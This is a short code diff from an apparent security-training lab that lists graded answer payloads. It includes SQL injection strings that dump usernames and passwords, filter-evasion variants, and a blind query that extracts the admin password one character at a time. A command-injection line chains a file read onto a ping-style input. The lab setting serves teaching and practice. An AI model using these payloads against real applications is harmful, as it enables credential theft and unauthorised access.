@@ -147,7 +147,7 @@ const PAYLOADS = {
   easy:{p:"' UNION SELECT username,password,role FROM users-- -", n:"Easy — raw. Classic UNION dump."},
   medium:{p:"' UNIunionON SELselectECT username,password,role FROM users-- -", n:"Medium — 'union'/'select' stripped once → nest them (UNIunionON)."},
   hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,password,role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #."},
-  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match / no-match). Boolean-extract: ' AND SUBSTRING((SELECT v FROM secrets WHERE k='db_flag'),1,1)='F'-- -"}
+  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match/no-match). Extract char-by-char from users: ' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S'-- -"}
  },
  cmd:{
   easy:{p:"127.0.0.1; cat private/cmdi_flag.txt", n:"Easy — raw. Chain with ;"},
